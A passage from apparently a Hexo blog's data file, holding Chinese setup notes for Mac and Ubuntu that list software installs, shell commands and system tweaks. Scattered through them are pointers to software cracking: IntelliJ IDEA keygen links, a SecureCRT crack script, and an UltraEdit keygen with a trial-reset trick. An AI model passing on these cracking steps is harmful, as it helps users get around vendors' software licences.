oog==\n```\n\n参见：\n - [IntelliJ IDEA 14 注册码](http://hw1287789687.iteye.com/blog/2153894)\n - [IntelliJ IDEA 14 在线注册机](http://inhu.net/intellij-idea-14-keygen.html)\n\n### 4. maven\n\n### 5. securecrt\n注册的主机配置路径：cd ~/Library/Application\\ Support/VanDyke/SecureCRT/Config/Sessions/\n\n参见：\n - [Mac下面的SecureCRT(附破解方案) 更新到最新的7.2](http://bbs.feng.com/read-htm-tid-6939481.html)\n - 评论[Mac下面的SecureCRT(附破解方案) 更新到最新的7.3.2](http://blog.csdn.net/skykingf/article/details/17450561)\n\n### 6. redis desktop manager\n\n### 7. mysql\n下载：mysql-5.6.27-osx10.9-x86_64.dmg\n正常安装，默认无密码。\n\n更改mysql root密码：\n``` shell\ncd /usr/local/mysql-5.6.27-osx10.8-x86_64/bin\nsudo ./mysqld_safe\n./mysqladmin -u root password 新密码\n```\n\n参见：\n - [MySQL for Mac 安装和基本操作(包含后期的环境变量设置)](http://2484055.blog.51cto.com/2474055/1335382)\n - [MySQLStartupItem.pkg missing from MySQL DMG](http://stackoverflow.com/questions/26110314/mysqlstartupitem-pkg-missing-from-mysql-dmg)\n\n### 8. mysql workbench\n\n### 9. JD-GUI\njava class反编译工具\n\n\n## 三、系统配置\n\n### 1. 截图快捷键\nCmd+Shift+3：全屏截图；截取整个屏幕，保存截图至桌面文件夹。\nCmd+Shift+4：区域截图；鼠标光标变成带坐标的小十字，通过拖拽截取特定区域，保存截图至桌面文件夹。\nCmd+Shift+4：单击空格键 - 鼠标单击指定窗口：窗口截图；出现小十字光标后对指定窗口按空格键，鼠标光标变成照相机，鼠标单击截取指定窗口，保存截图至桌面文件夹。\n参见：[OS X 系统自带的截图快捷键有哪些？](http://www.zhihu.com/question/19550327/answer/12222576)\n\n### 2. 时间显示设置\n右上角托盘设置。\n![mac时间显示设置](http://7xkl4i.com1.z0.glb.clouddn.com/mac时间显示设置.png)\n\n### 3. 更改功能键行为\n![mac更改功能键行为](http://7xkl4i.com1.z0.glb.clouddn.com/mac更改功能键行为.png)\n\n如果希望将顶部一行按键用作标准功能键（而不执行图标指示的特殊功能），但又不想按 Fn 键，请执行以下操作：\n（1）从 Apple 菜单中，选取系统偏好设置。\n（2）从显示菜单中，选取键盘（在 Mac OS X v10.5.8 或更早版本中，则为键盘与鼠标）。\n（3）点按“键盘”（如果需要的话）。\n（4）启用“将 F1、F2 等键用作标准功能键”。\n启用此选项时，顶部一行按键将用作标准功能键 (F1 - F12)，而不执行音量控制等特殊功能。启用此选项后，若要使用任一上述按键上所印图标指示的功能，请按 Fn。例如，如果启用了上述选项，请按 Fn-F10 来开关静音功能。\n\n参见：[Mac OS X：如何更改功能键的行为](https://support.apple.com/zh-cn/HT3399)\n\n### 4. 申请Apple ID\n到App Store里创建\n\n### 5. 文件剪切\n你只需选中目标文件，然后使用 Command+C 复制，然后用 Command +Option+V 将其移动到目标目录。\n\n[Mac 教程：OS X「剪切」移动文件的三种方法](http://sspai.com/28389)\n\n### 6. 显示隐藏文件(未尝试)\nMac 可以用命令行显示默认隐藏的文件：\n``` shell\ndefaults write com.apple.finder AppleShowAllFiles TRUE\nkillall Finder\n```\n\n参见：[ShowOrHide – 开关隐藏文件的显示[Mac]](http://www.appinn.com/showorhide/)\n\n### 7. 新建位于文件夹位置的终端窗口\nhttp://apple.stackexchange.com/a/42450/40485\n\n系统偏好设置 -> 键盘 -> 快捷键 -> 服务，勾选「新建位于文件夹位置的终端窗口」（后面的键盘快捷键可以不选），然后在 Finder 里面选中文件夹右键菜单的「服务」下面就会有「新建位于文件夹位置的终端窗口」这一子菜单了。\n\n参见：[MAC OSX右键菜单能否添加类似于“在终端中打开当前目录”的快捷方式](https://www.v2ex.com/t/81344)\n\n### 8. 打印机\n参见：[富士施乐打印机添加教程(For MAC)](http://wiki.sankuai.com/pages/viewpage.action?pageId=79933100)\n\n### 9. Mac怎么彻底关闭开机声音(粗略尝试不好用)\n关闭开机声音：`sudo nvram SystemAudioVolume=%80`\n恢复开机声音：`sudo nvram -d SystemAudioVolume`\n\n参见：[使用终端命令 关闭Mac电脑开机启动音](http://www.macx.cn/thread-2071828-1-1.html)\n\n### 10. 如何更改 OS X 截图默认保存路径\n``` shell\ndefaults write com.apple.screencapture location ~/Pictures/screenshots/\nkillall SystemUIServer\n```\n\n参见：\n - [更改OS X默认的截图文件名及格式](http://fduo.org/osx-screenshot-settings/)\n - [如何更改 OS X 截图默认保存路径](http://sspai.com/26327)\n\n### 11. Finder标题栏显示当前文件夹路径\n\n#### 标题栏显示当前文件夹路径\n``` shell\ndefaults write com.apple.finder _FXShowPosixPathInTitle -bool TRUE\nkillall Finder\n```\n\n#### 恢复默认设置\n``` shell\ndefaults delete com.apple.finder _FXShowPosixPathInTitle\nkillall Finder\n```\n\n参见：[[Mac]如何在Finder标题栏显示当前文件夹路径？](http://www.macgg.com/archives/7824.html)\n\n### 12. 邮件配置\n邮件客户端都需要提供邮件服务器信息：\n\n#### 接收邮件服务器\n请选择IMAP协议，并填写服务器地址为：imap.meituan.com ：端口 993 （SSL加密） （加密请不要使用TLS）\n\n#### 发送邮件服务器\n请选择SMTP协议，并填写服务器地址为：smtp.meituan.com : 端口 587 （TLS加密）（注意请开启SMTP发信认证）\n\n参考：[美团邮件系统](http://wiki.sankuai.com/pages/viewpage.action?pageId=22577293)\n\n\n### 13. 配色\n\n#### 文件列表颜色\n修改.bash_profile 或者 .profile，添加如下内容：\n```\nalias ll=\"ls -al\"\nalias grep='grep --color'\nalias egrep='egrep --color'\nalias fgrep='fgrep --color'\nalias tree=\"find . -print | sed -e 's;[^/]*/;|____;g;s;____|; |;g'\"\n\nexport CLICOLOR=1\nexport LSCOLORS=gxfxaxdxcxegedabagacad\n```\n\n#### vim着色\n修改.vimrc，添加如下内容：\n```\nsyntax on\n```\n\n### 14. brew\n\n#### 安装HomeBrew\n``` shell\nruby -e \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)\"\n```\n\n#### 安装Homebrew Cask\n``` shell\nbrew install caskroom/cask/brew-cask\n```\n\n\n### 15. tree\n``` shell\nbrew install tree\n```\n\n### 16. wget\n``` shell\nbrew install wget\n```\n\n\n### 17. 禁止修改文件扩展名的警告\n**借助终端**\n``` bash\ndefaults write com.apple.finder FXEnableExtensionChangeWarning -bool false\nkillall Finder\n```\n\n**界面设置**\n> 其实只要直接在 Finder 中按＂⌘,＂进入 Preferences，然后选择 “Advanced” – 取消 “Show warning before changing an extension” 前面的勾就可以了。\n\n参见：[OS X 小技巧 – 禁止修改文件扩展名的警告[Mac]](http://www.appinn.com/disablefile-extension-warning/)\n","slug":"article/mac/Mac装机软件","published":1,"updated":"2016-03-31T15:22:08.000Z","_id":"cilpxkgaf002eavbtk4f72i76","comments":1,"layout":"post","photos":[],"link":""},{"title":"ubuntu装机软件","date":"2015-12-29T05:58:00.000Z","_content":"\n<img src=\"/asserts/images/logo/ubuntu.png\" class=\"img-logo img-center\" />\n\n\n修改软件源为163的源。\n\n\n## 一、应用软件\n\n### 1. 安装vim\n命令：\n> sudo apt-get install vim\n\n\n### 2. chrome\n直接登录官方网站下载deb包。\nhttps://www.google.com/intl/zh-CN/chrome/browser/\n\n**注**：由于访问google需要翻墙，可以暂时下载百度网盘里的旧版本。\n\n\n### 3. 截图工具shutter\nubuntu软件中心可下载。\n\n14.04的shutter不提供自定义快捷键，可以利用系统自带的键盘快捷键设置来达到目的。\n\n**设置自定义快捷键方法**：设置 -> 键盘 -> 快捷键 -> 自定义快捷键\n\n命令：\n> shutter -s\n\n**注**：系统自带的截图工具也不错。\n\n\n<!-- more -->\n\n### 4. unity-tweak-tool\nunity桌面配置工具, ubuntu软件中心可下载。\n\n命令：\n> sudo apt-get install unity-tweak-tool\n\n\n### 5. 极点五笔输入法\n使用系统自带的极点五笔输入法\n14.04的ibus与系统软件捆绑，ibus坏了，可能导致系统崩溃。慎装，更加不要做任何删除ibus操作。\n\n\n### 6. 安装gnome-panel\ngnome面板工具，包含 **gnome-desktop-item-edit** 命令，用于创建桌面图标。\n\n命令：\n> sudo apt-get install gnome-panel\n\n例如：\n> `gnome-desktop-item-edit ~/Desktop/ --create-new`\n> gnome-desktop-item-edit ~/Desktop/app.desktop\n\n\n### 7. 百度准入go-bnac\n百度网盘里应该有。\n在百度工作专用，用于linux环境下连接百度准入。\n\n\n### 8. bcompare\n安装包，百度网盘有。\n**注**：依赖ia32-libs\n\n\n### 9. RabbitVCS\n安装步骤：\n> sudo add-apt-repository ppa:rabbitvcs/ppa\n> sudo apt-get update\n> sudo apt-get install rabbitvcs-core rabbitvcs-cli rabbitvcs-nautilus3 rabbitvcs-gedit\n\n**说明**：重启文档管理器，使用rabbitvcs-nautilus3生效。\n> nautilus -q\n\n**注**：不同的系统版本可能需要替换 rabbitvcs-nautilus3 为 rabbitvcs-nautilus 。另外，rabbitvcs-gedit 如无需要的话，可以不安装。\n\n**参考**：[ubuntu软件—RabbitVCS : TortoiseSVN 的替代者][^1]\n\n\n### 10. VPN工具\n优先使用cisco Anyconnect VPN Tool。\n\n如果连接不成功，则可以考虑安装openconnect。\n安装命令：\n> sudo apt-get install network-manager-openconnect-gnome\n\n连接VPN命令：\n> sudo openconnect vpn.sohu-inc.com\n\n\n### 11. 右键在当前位置打开终端\n命令：\n> sudo apt-get install nautilus-open-terminal\n\n**注**：安装完成后，需要重启文件管理器\n> nautilus -q\n\n\n### 12. 设置chrome代理\n**百度工作**：使用chrome插件 **Proxy SwitchySharp** 加载公司代理配置。\n**搜狐工作**：购买红杏网页浏览代理服务，并下载红杏chrome插件使用。\n\n\n### 13. ubuntu打印机\n**百度工作**：\n参考http://wiki.babel.baidu.com/twiki/bin/view/Com/Pmo/Iit/Babel/Ubuntu%E5%AE%89%E8%A3%85%E5%85%AC%E5%8F%B8%E6%89%93%E5%8D%B0%E6%9C%BA\n\n\n### 14. 经典菜单classicmenu-indicator\nubuntu软件中心有下载。\n\n命令：\n> `sudo apt-get install --fix-missing classicmenu-indicator`\n\n\n### 15. rar/zip格式压缩工具\n压缩&解压功能，能与ubuntu自带的归档管理器集成。\n\n安装命令：\n> sudo apt-get install rar unrar p7zip-full\n\n卸载命令：\n> sudo apt-get remove rar unrar p7zip-full\n\n\n### 16. chmsee\n命令：\n> sudo apt-get install chmsee\n\n软件源里可能没有chmsee，网上有已经打包好的deb包。\n**注**：由于ubuntu14.04软件库未提供命令下载，网上有已经打包好的deb包。百度网盘里有下载好的64位chmsee：chmsee_1.3.1.1-1~getdeb2_amd64.deb\n\n**参考**：[chmsee_1.3.1.1-1~getdeb2_amd64.deb][^2]\n\n\n### 17. virtualbox\n命令：\n> sudo apt-get install virtualbox-qt\n\n\n### 18. LONGENE QQ2013\n**前提条件**：64位系统需要安装ia32-libs\n\n安装步骤：\n> deb http://archive.ubuntu.com/ubuntu/ raring main restricted universe multiverse\n> sudo apt-get update\n> sudo apt-get install ia32-libs\n> sudo dpkg -i WineQQ2013-20131120-Longene.deb\n\n**注**：WineQQ2012-20121221-Longene.deb已经不让用，而新版本WineQQ2013SP6-20140102-Longene.deb界面又有问题。可以考虑使用webqq + 虚拟机的方式工作。\n\n**参考**：[wine qq 2013 for linux Ubuntu 64位兼容][^3]\n\n\n### 19. markdown编辑器haroopad\n**下载地址**：http://pad.haroopress.com/user.html\n\n\n### 20. wps-office\n**下载地址**：http://linux.wps.cn/\n\n安装字体管理器命令：\n> sudo apt-get install font-manager\n\n**注**：字体安装有问题，过程可能需要执行exe程序，比较坑，建议不使用需要的字段。(使用过程不会报错)\n\n\n### 21. 有道词典\n**下载地址**：http://cidian.youdao.com/index-linux.html\n\n**说明**：\n使用过程发现会系统出现卡顿的现象。所以，不使用时，最好关闭客户端。\n英文发音有问题。\n\n\n### 22. flashplayer独立播放器\n**下载地址**：http://fpdownload.macromedia.com/pub/flashplayer/updaters/11/flashplayer_11_sa.i386.tar.gz\n\n\n### 23. 切换默认的shell版本\n> sudo dpkg-reconfigure dash\n\n**参考**：[Shell编程笔记——Syntax error: \"(\" unexpected][^5]\n\n\n### 24. 百度网盘linux版\nDebian及基于Debian的发行版(比如ubuntu, linuxmint)请直接下载 bcloud-x.x.x.deb这个包, 然后双击deb包就能安装了;\n有些用户并没有安装apt包管理器的GUI界面, 也可以在终端里面安装:\n> $ sudo dpkg -i bcloud-x.x.x.deb\n> $ sudo apt-get -f install\n\n**参考**：\nhttps://github.com/LiuLang/bcloud\nhttps://github.com/LiuLang/bcloud-packages\n\n\n### 25. Ubuntu 14.04 64位字体美化(使用文泉驿微黑)\n> sudo aptitude install ttf-wqy-microhei\n\n**参考**：[Ubuntu 14.04 64位字体美化(使用文泉驿微黑)][^6]\n\n\n### 26. 安装gstreamer0.10-ffmpeg\n``` shell\nsudo add-apt-repository ppa:mc3man/trusty-media\nsudo apt-get update\nsudo apt-get install gstreamer0.10-ffmpeg\n```\n\n**参考**：[Ubuntu 14.04如何轻松启用H.264视频支持][11]\n\n\n\n### 27. 安装curl\n> sudo apt-get install curl\n\n\n\n## 二、开发软件\n\n### 1. 安装git\n命令：\n> sudo apt-get install git\n\n\n### 2. securecrt\nsecurecrt(使用securecrt_linux_crack.pl破解时，需要切换到root用户操作：su root)\n\n\n### 3. subversion\n**注**：可能安装rabbitvcs时已经安装\n\n命令：\n> sudo apt-get install subversion\n> sudo apt-get install libapache2-svn\n\n\n### 4. 安装mysql\n命令：\n> sudo apt-get install mysql-server\n> sudo apt-get install mysql-workbench\n\n\n### 5. java\n下载jdk bin或者tar.gz包，并安装。\n\n修改java配置 ~/.profile\n``` shell\nJAVA_HOME=/home/yeshaoting/java/jdk/jdk1.7.0_51\nCLASSPATH=$JAVA_HOME/jre/lib\nPATH=$PATH:$JAVA_HOME/bin\nexport JAVA_HOME CLASSPATH PATH\n```\n\n\n### 6. eclipse／STS\n**最新的STS下载地址**：http://spring.io/tools/sts/\n\n\n### 7. maven\n\n\n## 三、系统配置\n\n### 1. 设置root密码\n命令：\n> sudo passwd root\n\n\n### 2. 合上笔记本不休眠\n编辑/etc/default/acpi-support\n找到内容：LOCK_SCREEN=true，并修改为：LOCK_SCREEN=false\n\n\n### 3. 中文语言支持\n\n\n### 4. 用户目录英文名\n中文ubuntu里用户目录里的路径改成英文\n\n执行命令：\n> export LANG=en_US\n> xdg-user-dirs-gtk-update\n\n接下来，会跳出对话框询问：是否将目录转化为英文路径，同意并关闭。\n在终端中输入命令：export LANG=zh_CN\n关闭终端，并重起。下次进入系统，系统会提示是否把转化好的目录改回中文。\n选择不再提示，并取消修改。\n主目录的中文转英文就完成了~\n\n\n### 5. 自动挂载windows分区\n查看硬盘的分区情况：\n`df -h` 或者 `sudo fdisk -l` 或者使用GParted分区编辑器查看。\n\n编辑/etc/fstab文件，添加如下内容：\n``` shell\n# auto mount C disk\n/dev/sda1 /home/yeshaoting/windows/C ntfs-3g defaults,locale=zh_CN.UTF-8,umask=022 0 0\n\n# auto mount D disk\n/dev/sda5 /home/yeshaoting/windows/D ntfs-3g defaults,locale=zh_CN.UTF-8,umask=0,uid=1000,gid=1000 0 0\n\n# auto mount E disk\n/dev/sda6 /home/yeshaoting/windows/E ntfs-3g defaults,locale=zh_CN.UTF-8,umask=0,uid=1000,gid=1000 0 0\n```\n\n**说明**：umask=022表示只读，umask=0表示可读写，uid和gid设置所属权限（可以通过id username命令）。\n\n\n### 6. Eclipse设置 Javadoc背景色\n命令：\n> cd /usr/share/themes/Ambiance/gtk-2.0\n> sudo gedit gtkrc\n\n最终12.04及14.04修改gtkrc文件内容如下：\n``` shell\ngtk-color-scheme = \"base_color:#C7EDCC\\nfg_color:#4c4c4c\\ntooltip_fg_color:#000000\\nselected_bg_color:#f07746\\nselected_fg_color:#FFFFFF\\ntext_color:#3C3C3C\\nbg_color:#f6f4f2\\ntooltip_bg_color:#f2edbc\\nlink_color:#DD4814\"\n```\n\n**参考**：[Ubuntu 12.04 Eclipse设置 Javadoc背景色][^4]\n\n\n### 7. thundbird exchange插件ExQuilla\n\n\n\n## 四、软件储备\n\n### 1. Ubuntu下的阿里旺旺软件\n阿里旺旺的 Ubuntu 下的版本，下载地址是：http://ge.tt/8sPpGIA\n**注**：百度网盘里有。\n\n如遇无法登陆的情况，解除登陆限制即可。\n\n**参考**：http://wowubuntu.com/aliwangwang.html\n\n\n### 3.UltraEdit\n下载页面：http://www.ultraedit.com/downloads/uex.html\n下载地址：http://www.ultraedit.com/files/uex/Ubuntu/\n**注**：百度网盘里有。\n\n#### 关于破解\n1. 下载破解器：keygen_ue(百度网盘里有)\n2. 删除配置目录：~/.idm/uex/uex.conf\n\n**参考**：\n[UltraEdit for Linux破解][^7]\n[UltraEdit for linux 不断试用30天的方法 ][^8]\n\n\n### 4. UltraCompareX\n下载页面：http://www.ultraedit.com/downloads/ucx.html\n下载地址：http://www.ultraedit.com/files/ucx/Ubuntu/\n\n**注**：百度网盘里有。\n\n\n### 5. 飞鸽传书GNU/Linux版\n命令：\n> sudo apt-get install iptux\n\n下载地址：https://code.google.com/p/iptux/downloads/list\n\n**参考**：[信使][^10]\n\n\n### 6. winusb\n安装命令：\n``` shell\nsudo add-apt-repository ppa:colingille/freshlight\nsudo apt-get update\nsudo apt-get install winusb\n```\n\n**参考**：[WinUSB][^9]\n\n\n### 7. kwplayer\n需要下载 python3-xlib_xx.deb, python3-keybinder_xx.deb, kwplayer_xx.deb 这 三个软件包. 直接双击就能安装deb包.\n先安装python3-xlib, 之后是python3-keybinder, 最后是kwplayer.\n当然, 也可以在终端里安装, 比如:\n``` shell\nsudo dpkg -i kwplayer_xx.deb\nsudo apt-get -f install\n```\n\n**参考**：\nhttps://github.com/LiuLang/kwplayer\nhttps://github.com/LiuLang/kwplayer-packages\n\n\n### 8. Folder Color\n该软件已经集成到Ubuntu 15.04默认库中。\nubuntu14或ubuntu12想要安装此软件的话，需要额外添加软件库。\n\n安装命令如下：\n``` shell\nsudo add-apt-repository ppa:costales/folder-color\nsudo apt-get update\nsudo apt-get install folder-color\nnautilus -q\n```\n\n**参考**：[Folder Color 已添加到 Ubuntu 15.04 默认库中][^12]\n\n\n### ubuntu截图默认保存位置\n**参考**：[Default save directory for gnome-screenshot?][^13]\n\n\n\n[^1]: http://www.elain.org/?p=742\n[^2]: http://pkgs.org/ubuntu-14.04/getdeb-apps-amd64/chmsee_1.3.1.1-1~getdeb2_amd64.deb.html\n[^3]: http://www.longene.org/forum/viewtopic.php?t=4700\n[^4]: http://blog.csdn.net/qxb1229/article/details/8265616\n[^5]: http://blog.csdn.net/breeze5428/article/details/27353583\n[^6]: http://blog.csdn.net/tao_627/article/details/24180781\n[^7]: http://mjzhou.com/?p=158\n[^8]: http://blog.itpub.net/12216142/viewspace-708801\n[^9]: http://wiki.deepin.org/index.php?title=WinUSB\n[^10]: http://wiki.deepin.org/index.php?title=%E4%BF%A1%E4%BD%BF\n[^11]: http://imcn.me/html/y2014/19624.html\n[^12]: http://imcn.me/html/y2015/23176.html\n[^13]: http://askubuntu.com/a/134469\n","source":"_posts/article/linux/ubuntu装机软件.md","raw":"categories:\n  - 工具软件\ntags:\n  - ubuntu\n  - 装机\n  - 小记\ntitle: ubuntu装机软件\ndate: 2015-12-29 13:58:00\n---\n\n<img src=\"/asserts/images/logo/ubuntu.png\" class=\"img-logo img-center\" />\n\n\n修改软件源为163的源。\n\n\n## 一、应用软件\n\n### 1. 安装vim\n命令：\n> sudo apt-get install vim\n\n\n### 2. chrome\n直接登录官方网站下载deb包。\nhttps://www.google.com/intl/zh-CN/chrome/browser/\n\n**注**：由于访问google需要翻墙，可以暂时下载百度网盘里的旧版本。\n\n\n### 3. 截图工具shutter\nubuntu软件中心可下载。\n\n14.04的shutter不提供自定义快捷键，可以利用系统自带的键盘快捷键设置来达到目的。\n\n**设置自定义快捷键方法**：设置 -> 键盘 -> 快捷键 -> 自定义快捷键\n\n命令：\n> shutter -s\n\n**注**：系统自带的截图工具也不错。\n\n\n<!-- more -->\n\n### 4. unity-tweak-tool\nunity桌面配置工具, ubuntu软件中心可下载。\n\n命令：\n> sudo apt-get install unity-tweak-tool\n\n\n### 5. 极点五笔输入法\n使用系统自带的极点五笔输入法\n14.04的ibus与系统软件捆绑，ibus坏了，可能导致系统崩溃。慎装，更加不要做任何删除ibus操作。\n\n\n### 6. 安装gnome-panel\ngnome面板工具，包含 **gnome-desktop-item-edit** 命令，用于创建桌面图标。\n\n命令：\n> sudo apt-get install gnome-panel\n\n例如：\n> `gnome-desktop-item-edit ~/Desktop/ --create-new`\n> gnome-desktop-item-edit ~/Desktop/app.desktop\n\n\n### 7. 百度准入go-bnac\n百度网盘里应该有。\n在百度工作专用，用于linux环境下连接百度准入。\n\n\n### 8. bcompare\n安装包，百度网盘有。\n**注**：依赖ia32-libs\n\n\n### 9. RabbitVCS\n安装步骤：\n> sudo add-apt-repository ppa:rabbitvcs/ppa\n> sudo apt-get update\n> sudo apt-get install rabbitvcs-core rabbitvcs-cli rabbitvcs-nautilus3 rabbitvcs-gedit\n\n**说明**：重启文档管理器，使用rabbitvcs-nautilus3生效。\n> nautilus -q\n\n**注**：不同的系统版本可能需要替换 rabbitvcs-nautilus3 为 rabbitvcs-nautilus 。另外，rabbitvcs-gedit 如无需要的话，可以不安装。\n\n**参考**：[ubuntu软件—RabbitVCS : TortoiseSVN 的替代者][^1]\n\n\n### 10. VPN工具\n优先使用cisco Anyconnect VPN Tool。\n\n如果连接不成功，则可以考虑安装openconnect。\n安装命令：\n> sudo apt-get install network-manager-openconnect-gnome\n\n连接VPN命令：\n> sudo openconnect vpn.sohu-inc.com\n\n\n### 11. 右键在当前位置打开终端\n命令：\n> sudo apt-get install nautilus-open-terminal\n\n**注**：安装完成后，需要重启文件管理器\n> nautilus -q\n\n\n### 12. 设置chrome代理\n**百度工作**：使用chrome插件 **Proxy SwitchySharp** 加载公司代理配置。\n**搜狐工作**：购买红杏网页浏览代理服务，并下载红杏chrome插件使用。\n\n\n### 13. ubuntu打印机\n**百度工作**：\n参考http://wiki.babel.baidu.com/twiki/bin/view/Com/Pmo/Iit/Babel/Ubuntu%E5%AE%89%E8%A3%85%E5%85%AC%E5%8F%B8%E6%89%93%E5%8D%B0%E6%9C%BA\n\n\n### 14. 经典菜单classicmenu-indicator\nubuntu软件中心有下载。\n\n命令：\n> `sudo apt-get install --fix-missing classicmenu-indicator`\n\n\n### 15. rar/zip格式压缩工具\n压缩&解压功能，能与ubuntu自带的归档管理器集成。\n\n安装命令：\n> sudo apt-get install rar unrar p7zip-full\n\n卸载命令：\n> sudo apt-get remove rar unrar p7zip-full\n\n\n### 16. chmsee\n命令：\n> sudo apt-get install chmsee\n\n软件源里可能没有chmsee，网上有已经打包好的deb包。\n**注**：由于ubuntu14.04软件库未提供命令下载，网上有已经打包好的deb包。百度网盘里有下载好的64位chmsee：chmsee_1.3.1.1-1~getdeb2_amd64.deb\n\n**参考**：[chmsee_1.3.1.1-1~getdeb2_amd64.deb][^2]\n\n\n### 17. virtualbox\n命令：\n> sudo apt-get install virtualbox-qt\n\n\n### 18. LONGENE QQ2013\n**前提条件**：64位系统需要安装ia32-libs\n\n安装步骤：\n> deb http://archive.ubuntu.com/ubuntu/ raring main restricted universe multiverse\n> sudo apt-get update\n> sudo apt-get install ia32-libs\n> sudo dpkg -i WineQQ2013-20131120-Longene.deb\n\n**注**：WineQQ2012-20121221-Longene.deb已经不让用，而新版本WineQQ2013SP6-20140102-Longene.deb界面又有问题。可以考虑使用webqq + 虚拟机的方式工作。\n\n**参考**：[wine qq 2013 for linux Ubuntu 64位兼容][^3]\n\n\n### 19. markdown编辑器haroopad\n**下载地址**：http://pad.haroopress.com/user.html\n\n\n### 20. wps-office\n**下载地址**：http://linux.wps.cn/\n\n安装字体管理器命令：\n> sudo apt-get install font-manager\n\n**注**：字体安装有问题，过程可能需要执行exe程序，比较坑，建议不使用需要的字段。(使用过程不会报错)\n\n\n### 21. 有道词典\n**下载地址**：http://cidian.youdao.com/index-linux.html\n\n**说明**：\n使用过程发现会系统出现卡顿的现象。所以，不使用时，最好关闭客户端。\n英文发音有问题。\n\n\n### 22. flashplayer独立播放器\n**下载地址**：http://fpdownload.macromedia.com/pub/flashplayer/updaters/11/flashplayer_11_sa.i386.tar.gz\n\n\n### 23. 切换默认的shell版本\n> sudo dpkg-reconfigure dash\n\n**参考**：[Shell编程笔记——Syntax error: \"(\" unexpected][^5]\n\n\n### 24. 百度网盘linux版\nDebian及基于Debian的发行版(比如ubuntu, linuxmint)请直接下载 bcloud-x.x.x.deb这个包, 然后双击deb包就能安装了;\n有些用户并没有安装apt包管理器的GUI界面, 也可以在终端里面安装:\n> $ sudo dpkg -i bcloud-x.x.x.deb\n> $ sudo apt-get -f install\n\n**参考**：\nhttps://github.com/LiuLang/bcloud\nhttps://github.com/LiuLang/bcloud-packages\n\n\n### 25. Ubuntu 14.04 64位字体美化(使用文泉驿微黑)\n> sudo aptitude install ttf-wqy-microhei\n\n**参考**：[Ubuntu 14.04 64位字体美化(使用文泉驿微黑)][^6]\n\n\n### 26. 安装gstreamer0.10-ffmpeg\n``` shell\nsudo add-apt-repository ppa:mc3man/trusty-media\nsudo apt-get update\nsudo apt-get install gstreamer0.10-ffmpeg\n```\n\n**参考**：[Ubuntu 14.04如何轻松启用H.264视频支持][11]\n\n\n\n### 27. 安装curl\n> sudo apt-get install curl\n\n\n\n## 二、开发软件\n\n### 1. 安装git\n命令：\n> sudo apt-get install git\n\n\n### 2. securecrt\nsecurecrt(使用securecrt_linux_crack.pl破解时，需要切换到root用户操作：su root)\n\n\n### 3. subversion\n**注**：可能安装rabbitvcs时已经安装\n\n命令：\n> sudo apt-get install subversion\n> sudo apt-get install libapache2-svn\n\n\n### 4. 安装mysql\n命令：\n> sudo apt-get install mysql-server\n> sudo apt-get install mysql-workbench\n\n\n### 5. java\n下载jdk bin或者tar.gz包，并安装。\n\n修改java配置 ~/.profile\n``` shell\nJAVA_HOME=/home/yeshaoting/java/jdk/jdk1.7.0_51\nCLASSPATH=$JAVA_HOME/jre/lib\nPATH=$PATH:$JAVA_HOME/bin\nexport JAVA_HOME CLASSPATH PATH\n```\n\n\n### 6. eclipse／STS\n**最新的STS下载地址**：http://spring.io/tools/sts/\n\n\n### 7. maven\n\n\n## 三、系统配置\n\n### 1. 设置root密码\n命令：\n> sudo passwd root\n\n\n### 2. 合上笔记本不休眠\n编辑/etc/default/acpi-support\n找到内容：LOCK_SCREEN=true，并修改为：LOCK_SCREEN=false\n\n\n### 3. 中文语言支持\n\n\n### 4. 用户目录英文名\n中文ubuntu里用户目录里的路径改成英文\n\n执行命令：\n> export LANG=en_US\n> xdg-user-dirs-gtk-update\n\n接下来，会跳出对话框询问：是否将目录转化为英文路径，同意并关闭。\n在终端中输入命令：export LANG=zh_CN\n关闭终端，并重起。下次进入系统，系统会提示是否把转化好的目录改回中文。\n选择不再提示，并取消修改。\n主目录的中文转英文就完成了~\n\n\n### 5. 自动挂载windows分区\n查看硬盘的分区情况：\n`df -h` 或者 `sudo fdisk -l` 或者使用GParted分区编辑器查看。\n\n编辑/etc/fstab文件，添加如下内容：\n``` shell\n# auto mount C disk\n/dev/sda1 /home/yeshaoting/windows/C ntfs-3g defaults,locale=zh_CN.UTF-8,umask=022 0 0\n\n# auto mount D disk\n/dev/sda5 /home/yeshaoting/windows/D ntfs-3g defaults,locale=zh_CN.UTF-8,umask=0,uid=1000,gid=1000 0 0\n\n# auto mount E disk\n/dev/sda6 /home/yeshaoting/windows/E ntfs-3g defaults,locale=zh_CN.UTF-8,umask=0,uid=1000,gid=1000 0 0\n```\n\n**说明**：umask=022表示只读，umask=0表示可读写，uid和gid设置所属权限（可以通过id username命令）。\n\n\n### 6. Eclipse设置 Javadoc背景色\n命令：\n> cd /usr/share/themes/Ambiance/gtk-2.0\n> sudo gedit gtkrc\n\n最终12.04及14.04修改gtkrc文件内容如下：\n``` shell\ngtk-color-scheme = \"base_color:#C7EDCC\\nfg_color:#4c4c4c\\ntooltip_fg_color:#000000\\nselected_bg_color:#f07746\\nselected_fg_color:#FFFFFF\\ntext_color:#3C3C3C\\nbg_color:#f6f4f2\\ntooltip_bg_color:#f2edbc\\nlink_color:#DD4814\"\n```\n\n**参考**：[Ubuntu 12.04 Eclipse设置 Javadoc背景色][^4]\n\n\n### 7. thundbird exchange插件ExQuilla\n\n\n\n## 四、软件储备\n\n### 1. Ubuntu下的阿里旺旺软件\n阿里旺旺的 Ubuntu 下的版本，下载地址是：http://ge.tt/8sPpGIA\n**注**：百度网盘里有。\n\n如遇无法登陆的情况，解除登陆限制即可。\n\n**参考**：http://wowubuntu.com/aliwangwang.html\n\n\n### 3.UltraEdit\n下载页面：http://www.ultraedit.com/downloads/uex.html\n下载地址：http://www.ultraedit.com/files/uex/Ubuntu/\n**注**：百度网盘里有。\n\n#### 关于破解\n1. 下载破解器：keygen_ue(百度网盘里有)\n2. 删除配置目录：~/.idm/uex/uex.conf\n\n**参考**：\n[UltraEdit for Linux破解][^7]\n[UltraEdit for linux 不断试用30天的方法 ][^8]\n\n\n### 4. UltraCompareX\n下载页面：http://www.ultraedit.com/downloads/ucx.html\n下载地址：http://www.ultraedit.com/files/ucx/Ubuntu/\n\n**注**：百度网盘里有。\n\n\n### 5. 飞鸽传书GNU/Linux版\n命令：\n> sudo apt-get install iptux\n\n下载地址：https://code.google.com/p/iptux/downloads/list\n\n**参考**：[信使][^10]\n\n\n### 6. winusb\n安装命令：\n``` shell\nsudo add-apt-repository ppa:colingille/freshlight\nsudo apt-get update\nsudo apt-get install winusb\n```\n\n**参考**：[WinUSB][^9]\n\n\n### 7. kwplayer\n需要下载 python3-xlib_xx.deb, 